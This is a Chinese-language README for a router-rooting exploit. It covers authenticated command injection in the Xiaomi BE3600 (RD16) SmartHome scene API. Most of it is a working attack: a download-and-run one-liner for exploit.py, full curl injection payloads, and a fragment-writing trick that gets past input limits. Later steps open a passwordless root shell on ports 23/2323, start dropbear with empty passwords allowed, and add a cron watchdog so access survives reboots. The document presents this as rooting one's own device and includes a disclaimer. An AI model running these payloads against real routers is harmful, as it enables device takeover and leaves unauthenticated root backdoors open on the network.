# Xiaomi BE3600 (RD16) — SmartHome Scene 命令注入 → Root Shell / SSH

> 已验证设备：**Xiaomi BE3600 路由器（内部型号 RD16，中国版）**
> 已验证固件：**MIUI ROM 1.0.41 release**（2025-04-01 构建，Qualcomm IPQ5312 / ARMv7 / OpenWrt 18.06 / busybox 1.36.1）
> 漏洞类型：**认证后命令注入**（需要 Web 管理密码）
> 影响：拿到 root shell 并可持久化 SSH
>
> English: [README.en.md](README.en.md)

## 主要路径

```
Web 管理密码
    │
    ▼
POST api/xqsystem/login ────────────────────────────► 拿到 stok token
    │
    ▼
POST api/xqsmarthome/request_smartcontroller
  scene_setting：wan_block action 的 mac 字段含 \n
    │   smartcontroller 把 mac 未转义地拼进
    │   system("/usr/sbin/sysapi macfilter set mac=%s wan=%s;... commit")
    ▼
scene_start ──► 注入命令以 root 执行（≤18 字符/条）
    │
    ▼
碎片写入（echo -n F>/tmp/N + cat /tmp/?>x + sh x）
    │   绕过 18 字符与禁用字符限制，写任意脚本文本
    ▼
inetd.conf + /usr/sbin/inetd ──► :23 / :2323 免密 root /bin/sh
    │
    ▼
/data + /etc/crontabs（sec_cfg）──► 看门狗每分钟自愈
dropbear + authorized_keys ────► :22 SSH（密钥/密码均可用）
```

- **认证后 RCE**：需要 Web 管理密码换 `stok` token 才能到达注入接口，不是未授权 RCE
- XMiR-Patcher 的历史注入点（`start_binding` 等）在 1.0.41 已全部修复；这条 `wan_block` 通道是目前唯一实测可用的注入面
- `/etc` 是 ramfs（重启全清），持久化只能落在 `/data`（UBIFS）与 `/etc/crontabs`（sec_cfg ext4）上

## 实测约束

| 约束 | 说明 |
|---|---|
| 命令长度 | 每条注入命令 ≤18 字符（fortify snprintf 边界，超限 daemon 崩溃） |
| 禁用字符 | `' " ; | $ &` 反引号 `\`；`\n` 经 JSON 双层转义可注入真换行 |
| 场景结构 | 每场景只放 1 个 action（多 action 会崩 daemon） |
| 长驻进程 | `system()` 等待管道 EOF——inetd/dropbear 这类 daemon 要先写文件或交给 procd，直接跑会卡死调用方 |
| 数字结尾碎片 | `echo -n ..D>/tmp/N`（D 为数字）被解析成 `D>` fd 重定向、文件写空——需在 `>` 前补空格（`..D >/tmp/N`） |
| 可写区域 | `/etc` ramfs 重启全清；`/data`、`/etc/crontabs`（sec_cfg）、`/etc/config` 持久 |

## 懒人命令（免克隆，全自动）

macOS / Linux（需 `python3` + `curl`）：

```bash
curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist
```

Windows PowerShell（`python` 不存在就把命令里的 `python` 换成 `py`）：

```powershell
irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password '你的管理密码' --stage persist
```

- `--stage persist` = 全自动：注入 → inetd（:23/:2323 root shell）→ dropbear（:22 SSH）→ `/data` + cron 看门狗，重启自动恢复
- 追加 `--pubkey 'ssh-rsa AAAA...'` 可同时写入 SSH 公钥，之后 `ssh root@192.168.31.1`
- 只要一次性 shell：把 `--stage persist` 换成 `--stage shell`，完成后 `nc 192.168.31.1 23`

## 快速复现（exploit.py）

```bash
git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh

python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage shell
# 之后: nc <路由器IP> 23  →  root /bin/sh

python3 exploit.py --ip 192.168.31.1 --password '你的管理密码' --stage persist \
    --pubkey 'ssh-rsa AAAA...你的公钥'
# SSH（:22）+ shell（:23/:2323）自动恢复，重启不掉
```

exploit.py 只用标准库，完成登录→注入→inetd→(可选)持久化全过程。

## 原理（碎片写入法）

18 字符塞不下有用命令，把脚本拆成 ≤3 字符的碎片写进单字符文件再拼接：

```sh
echo -n nvr>/tmp/0     # 文件 /tmp/0 = "nvr"
echo -n am >/tmp/1     # 参数间天然产生空格 -> 写入 "am "
echo -n 2 >/tmp/2      # 数字结尾必须 ' >'，否则成 fd 重定向
cat /tmp/?>/tmp/x      # 按 glob 序拼回完整脚本
sh /tmp/x
```

## 完整实现方式

下面是不依赖工具的完整手工路径（与 exploit.py 等价），每一步都可单独验证。

### 0. 前提

- 电脑与路由器同一局域网，能访问 `http://<AP_IP>/cgi-bin/luci`
- 知道 Web 管理密码

### 1. 登录拿 token

```bash
TOK=$(curl -s -X POST 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/login' \
    --data 'username=admin&password=你的密码&logtype=2' \
    | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "$TOK"
```

> 注意登录 body 必须用 `--data` 原样发，不要 `--data-urlencode`（会把 `&` 编码进参数名）。

### 2. 命令执行通道：scene + wan_block

```bash
# 建场景（action_list 只放 1 个 action）
curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_setting","id":0,"name":"x","launch":{"mode":"home"},"action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,"payload":"{\"command\": \"wan_block\", \"mac\": \"AA\nid>/tmp/messages\n\"}"}]}'
# → {"code":0,"id":<sid>}

# 触发
curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_start","id":<sid>}'
```

`mac` 字段为 `AA\n<CMD>\n`，注入的命令与 `macfilter commit` 换行隔开并行执行。

### 3. 执行结果读回

`/tmp/messages` 会进 syslog 打包文件。先让 daemon 把文件内容 cp 过去，再下载：

```bash
# 让 daemon 执行 cp（把任意文件拷进 /tmp/messages）
# mac=AA\ncp /tmp/x /tmp/messages\n  （同样走 scene 通道）

# 拿打包文件
F=$(curl -s "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/sys_log" \
    | grep -o '"file":"[^"]*"' | cut -d'"' -f4)
curl -s -o sl.tar.gz \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/c_download/$F"
tar -xzf sl.tar.gz -C sl && head sl/tmp/messages
```

打包里还有 `stat/system-02-ps.txt`、`stat/hardware-01-bdata.txt`、`stat/firewall-01-iptable.txt` 等，直接看进程/nvram/iptables。

### 4. 写长脚本（碎片法）

18 字符内只能塞下 `echo -n F>/tmp/N` 形式的碎片，把脚本内容切片：

```sh
rm -f /tmp/?                          # 清掉单字符文件
echo -n nvr>/tmp/0; echo -n am >/tmp/1   # 每条一个 scene
echo -n 2 >/tmp/2                        # 数字结尾必须 ' >'
echo -n l/b>/tmp/3
cat /tmp/?>/tmp/x                     # 按 glob 序拼回
sh /tmp/x                             # 执行
```

文件名用 `0-9a-z`（36 个名额），超出就 `cat /tmp/?>/tmp/xx` 移到双字符名再继续。

### 5. 拿 shell：inetd

裸 `telnetd` 会因 `nvram get telnet_en`/`bdata get telnet_en` 检查秒退；`set_telnet` 又被 `apps.telnet` 特性开关挡住。改用 inetd（不检查该项）：

```sh
# 脚本内容（碎片法写入）
cp /tmp/ii /etc/inetd.conf
inetd
```

`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`（inetd 自 daemonize，不卡调用方）。之后 `nc <ip> 23` → 免密 root shell。多绑几个端口就写多行 conf。

### 6. SSH（可选，更稳妥）

```sh
# /etc/dropbear/dropbear_rsa_host_key 是 0 字节占位文件，必须先删
rm /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /data/dropbear_rsa_host_key     # ~1min，生成到 /data（持久）
mkdir -p /etc/dropbear
echo '你的 ssh-rsa 公钥' > /etc/dropbear/authorized_keys
/usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B  # -B 允许空密码
```

`ssh -i 私钥 root@<ip>` 即通。此固件 musl 不支持 `$6$` sha512 密码哈希，密码认证用 `$1$` md5。

### 7. 持久化

`/etc` 是 ramfs，重启回 squashfs 初始态——但 `/data`（UBIFS）与 `/etc/crontabs`（sec_cfg ext4）持久。写 `/data/persist.sh`：

```sh
#!/bin/sh
mkdir -p /etc/dropbear
cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
cp /data/inetd.conf /etc/inetd.conf 2>/dev/null
pgrep -x inetd    >/dev/null 2>&1 || /usr/sbin/inetd
pgrep -x dropbear >/dev/null 2>&1 || \
    /usr/sbin/dropbear -r /data/dropbear_rsa_host_key -B
```

`/etc/crontabs/root` 加一行（该文件在 sec_cfg 上，重启不掉）：

```
* * * * * sh /data/persist.sh >/dev/null 2>&1
```

重启后 ~1 分钟 inetd + dropbear 自动恢复。

## 涉及文件

- `exploit.py` — 单文件工具（stdlib only），完成登录→注入→inetd→(可选)持久化
- `docs/TECHNICAL.md` — 注入点源码定位、限制推导、备选通道（中文）
- `docs/TECHNICAL_EN.md` — 上述技术细节的英文版
- `README.en.md` — 英文版说明

## 免责声明

仅用于你自己拥有/被授权的设备。这是一个**认证后**漏洞（需管理密码），不属于未授权 RCE；如果你发现同接口的未授权绕过，请走厂商协调披露渠道。

## License

MIT
